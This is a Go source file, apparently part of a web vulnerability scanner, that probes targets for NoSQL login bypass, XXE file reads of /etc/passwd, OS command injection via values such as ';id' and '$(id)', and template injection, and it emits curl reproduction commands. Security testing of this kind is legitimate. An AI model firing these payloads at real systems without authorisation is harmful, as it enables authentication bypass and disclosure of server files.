package probers

import (
	"context"
	"fmt"
	"net/url"
	"strings"

	"github.com/borntobeyours/ouroboros/pkg/types"
)

// InjectionProber tests for various injection vulnerabilities beyond SQLi.
type InjectionProber struct{}

func (p *InjectionProber) Name() string { return "injection" }

func (p *InjectionProber) Probe(ctx context.Context, target types.Target, endpoints []types.Endpoint) []types.Finding {
	cfg := NewProberConfig(target)
	if currentClassified != nil {
		cfg.Classified = currentClassified
	}
	var findings []types.Finding

	findings = append(findings, p.testNoSQLInjection(cfg)...)
	findings = append(findings, p.testXXE(cfg, endpoints)...)
	findings = append(findings, p.testCommandInjection(cfg, endpoints)...)
	findings = append(findings, p.testSSTI(cfg)...)

	return findings
}

func (p *InjectionProber) testNoSQLInjection(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	if cfg.Classified == nil {
		return findings
	}

	// NoSQL injection in login endpoints
	payloads := []struct {
		body string
		desc string
	}{
		{`{"email":{"$gt":""},"password":{"$gt":""}}`, "MongoDB operator injection in login"},
		{`{"email":{"$ne":""},"password":{"$ne":""}}`, "MongoDB $ne operator bypass"},
		{`{"username":{"$gt":""},"password":{"$gt":""}}`, "MongoDB operator injection (username field)"},
	}

	for _, ep := range cfg.Classified.Login {
		path := extractPath(ep.URL)
		for _, pl := range payloads {
			status, _, respBody, err := cfg.DoRequest("POST", ep.URL,
				strings.NewReader(pl.body), map[string]string{"Content-Type": "application/json"})
			if err != nil {
				continue
			}

			if status == 200 && strings.Contains(respBody, "token") {
				findings = append(findings, MakeFinding(
					"NoSQL Injection - Login Bypass",
					"Critical",
					fmt.Sprintf("Login endpoint vulnerable to NoSQL injection: %s", pl.desc),
					path,
					"POST",
					"CWE-943",
					fmt.Sprintf(`curl -X POST %s -H "Content-Type: application/json" -d '%s'`, ep.URL, pl.body),
					fmt.Sprintf("HTTP %d - Auth bypass: %s", status, truncate(respBody, 200)),
					"nosql_injection",
					0,
				))
				return findings
			} else if status == 500 || strings.Contains(strings.ToLower(respBody), "invalid") {
				findings = append(findings, MakeFinding(
					"NoSQL Injection Attempt - Error Response",
					"Medium",
					fmt.Sprintf("Login endpoint processes NoSQL operators producing unexpected errors: %s", pl.desc),
					path,
					"POST",
					"CWE-943",
					fmt.Sprintf(`curl -X POST %s -H "Content-Type: application/json" -d '%s'`, ep.URL, pl.body),
					fmt.Sprintf("HTTP %d - Error: %s", status, truncate(respBody, 200)),
					"nosql_injection",
					0,
				))
				return findings
			}
		}
		break // Only test the first login endpoint
	}

	return findings
}

func (p *InjectionProber) testXXE(cfg *ProberConfig, endpoints []types.Endpoint) []types.Finding {
	var findings []types.Finding

	xxePayload := `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><test>&xxe;</test></root>`

	// Test endpoints that accept POST with XML/JSON content
	tested := make(map[string]bool)
	for _, ep := range endpoints {
		if ep.HasCategory(types.CatStatic) {
			continue
		}

		path := extractPath(ep.URL)
		if tested[path] {
			continue
		}

		lowerPath := strings.ToLower(path)
		ct := strings.ToLower(ep.ContentType)

		// Skip RSS/Atom feeds — they serve XML via GET, not accept XML input
		if strings.Contains(lowerPath, "/feed") || strings.Contains(lowerPath, "/rss") ||
			strings.Contains(lowerPath, "/atom") || strings.HasSuffix(lowerPath, ".xml") {
			continue
		}

		// Skip static assets
		if IsStaticAssetURL(ep.URL) {
			continue
		}

		// Only test endpoints likely to accept XML input:
		// - POST endpoints, or
		// - Endpoints with XML/JSON content type that aren't pure read APIs, or
		// - Upload/import/order endpoints
		isUploadLike := strings.Contains(lowerPath, "upload") ||
			strings.Contains(lowerPath, "import") ||
			strings.Contains(lowerPath, "order") ||
			strings.Contains(lowerPath, "b2b") ||
			strings.Contains(lowerPath, "soap")
		acceptsStructured := strings.Contains(ct, "xml") || strings.Contains(ct, "json")

		if ep.Method != "POST" && !isUploadLike && !acceptsStructured {
			continue
		}

		tested[path] = true

		headers := map[string]string{"Content-Type": "application/xml"}
		if cfg.AuthToken != "" {
			headers["Authorization"] = cfg.AuthToken
		}
		status, _, respBody, err := cfg.DoRequest("POST", ep.URL,
			strings.NewReader(xxePayload), headers)
		if err != nil {
			continue
		}

		lowerBody := strings.ToLower(respBody)
		if strings.Contains(lowerBody, "root:") {
			findings = append(findings, MakeFinding(
				fmt.Sprintf("XML External Entity (XXE) Injection at %s", path),
				"Critical",
				"The endpoint processes XML input and is vulnerable to XXE injection, allowing file system access.",
				path,
				"POST",
				"CWE-611",
				fmt.Sprintf(`curl -X POST %s -H "Content-Type: application/xml" -d '%s'`, ep.URL, xxePayload),
				fmt.Sprintf("HTTP %d - /etc/passwd content: %s", status, truncate(respBody, 200)),
				"xxe",
				0,
			))
			return findings
		} else if status == 200 && len(respBody) > 10 {
			findings = append(findings, MakeFinding(
				fmt.Sprintf("XXE - XML Processing Accepted at %s", path),
				"High",
				"The endpoint processes XML input, potentially vulnerable to XXE injection.",
				path,
				"POST",
				"CWE-611",
				fmt.Sprintf(`curl -X POST %s -H "Content-Type: application/xml" -d '%s'`, ep.URL, xxePayload),
				fmt.Sprintf("HTTP %d - Response: %s", status, truncate(respBody, 200)),
				"xxe",
				0,
			))
		}
	}

	return findings
}

func (p *InjectionProber) testCommandInjection(cfg *ProberConfig, endpoints []types.Endpoint) []types.Finding {
	var findings []types.Finding

	if cfg.AuthToken == "" {
		return findings
	}

	// Test command injection on API endpoints that accept user input
	cmdPayloads := []string{";id", "$(id)", "`id`", "| id", "|| id"}

	for _, ep := range endpoints {
		if ep.HasCategory(types.CatStatic) || ep.HasCategory(types.CatSearch) {
			continue
		}

		path := extractPath(ep.URL)
		lowerPath := strings.ToLower(path)

		// Focus on endpoints likely to process user input on the server
		if !strings.Contains(lowerPath, "chat") && !strings.Contains(lowerPath, "profile") &&
			!strings.Contains(lowerPath, "erasure") && !strings.Contains(lowerPath, "execute") &&
			!strings.Contains(lowerPath, "run") && !strings.Contains(lowerPath, "eval") &&
			!strings.Contains(lowerPath, "process") && !strings.Contains(lowerPath, "convert") &&
			!strings.Contains(lowerPath, "transform") && !ep.HasCategory(types.CatAPI) {
			continue
		}

		for _, cmdPayload := range cmdPayloads {
			for _, field := range []string{"query", "input", "command", "data", "email", "username"} {
				body := fmt.Sprintf(`{"%s":"test%s"}`, field, cmdPayload)
				status, _, respBody, err := cfg.DoRequest("POST", ep.URL,
					strings.NewReader(body), map[string]string{"Content-Type": "application/json"})
				if err != nil {
					continue
				}

				lowerBody := strings.ToLower(respBody)
				if strings.Contains(lowerBody, "uid=") || strings.Contains(lowerBody, "root") {
					findings = append(findings, MakeFinding(
						fmt.Sprintf("Command Injection - %s", path),
						"Critical",
						"The endpoint is vulnerable to OS command injection via user-controlled input.",
						path,
						"POST",
						"CWE-78",
						fmt.Sprintf(`curl -X POST %s -H "Content-Type: application/json" -d '%s'`, ep.URL, body),
						fmt.Sprintf("HTTP %d - Command output: %s", status, truncate(respBody, 200)),
						"command_injection",
						0,
					))
					return findings
				}
			}
		}
	}

	return findings
}

func (p *InjectionProber) testSSTI(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	if cfg.Classified == nil {
		return findings
	}

	sstiPayloads := []string{`{{7*7}}`, `${7*7}`, `<%= 7*7 %>`}

	// Test SSTI in search endpoints
	for _, ep := range cfg.Classified.Search {
		path := extractPath(ep.URL)
		baseEndpoint := strings.Split(ep.URL, "?")[0]
		paramToTest := findSearchParam(ep)

		for _, payload := range sstiPayloads {
			encoded := url.QueryEscape(payload)
			testURL := fmt.Sprintf("%s?%s=%s", baseEndpoint, paramToTest, encoded)
			status, _, respBody, err := cfg.DoRequest("GET", testURL, nil, nil)
			if err != nil {
				continue
			}

			if strings.Contains(respBody, "49") && !strings.Contains(respBody, payload) {
				findings = append(findings, MakeFinding(
					"Server-Side Template Injection (SSTI)",
					"High",
					"The search endpoint evaluates template expressions, indicating SSTI vulnerability.",
					path,
					"GET",
					"CWE-94",
					fmt.Sprintf(`curl "%s"`, testURL),
					fmt.Sprintf("HTTP %d - Template evaluated (49 found): %s", status, truncate(respBody, 200)),
					"ssti",
					0,
				))
				return findings
			}
		}
	}

	return findings
}
